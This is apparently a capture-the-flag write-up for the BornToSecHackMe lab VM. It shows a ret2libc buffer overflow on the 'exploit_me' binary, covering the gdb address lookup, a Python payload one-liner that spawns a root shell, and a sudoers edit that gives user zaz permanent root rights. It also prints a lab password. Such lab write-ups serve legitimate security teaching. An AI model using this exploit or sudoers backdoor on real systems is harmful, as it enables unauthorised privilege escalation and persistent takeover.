# Buffer overflow

After getting access to `zaz` and following the buffer overflow method from the first writeup (**bomb**), we can grant `sudo` rights to zaz.

Again, we need to create a buffer overflow, using the previous method :<br/>
`export SHELLSH=/bin/sh`

Inside `main.c` :

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char **argv)
{
        char *ptr = getenv("SHELLSH");
        if (ptr != NULL)
        {
                printf("Estimated address: %p\n", ptr);
                return 0;
        }
}
```

Using gdb on `exploit_me` once again, let's get back the adresses of `system` and `exit`.

```
gdb exploit_me
b main
r
p system --> $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
p exit --> $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

Compile the script, then execute it :
```
zaz@BornToSecHackMe:~$ ./env_addr
Estimated address: 0xbfffffba
```

Now let's create a buffer overflow to launch `/bin/sh` as `root`. (You might have to play with the last hexadecimal value to get it right, since our SHELLSH address is approximative).
```
./exploit_me `python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + '\xb7\xe5\xeb\xe0'[::-1]) + '\xbf\xff\xff\xba'[::-1]"`
```


# Visudo

Once we're `root`, we can edit the `/etc/sudoers` file using `visudo` (under nano).<br/>
Let's grand `zaz` the exact same rights as root :

```
# User privilege specification
root	ALL=(ALL:ALL) ALL
zaz     ALL=(ALL:ALL) ALL
[...]
```

Save the file, then close the running shell (you should come back as zaz).<br>
Now we should be able to log as root using zaz's password. Let's try !<br>
```
$ sudo su
Password : 646da671ca01bb5d84dbb5fb2238dc8e
root@BornToSecHackMe:/home/zaz#
$ whoami
root
```

Voilà !

*(We can also power down the VM, turn it on again and log as zaz through ssh then `sudo su` to try it out and make sure it's right.)*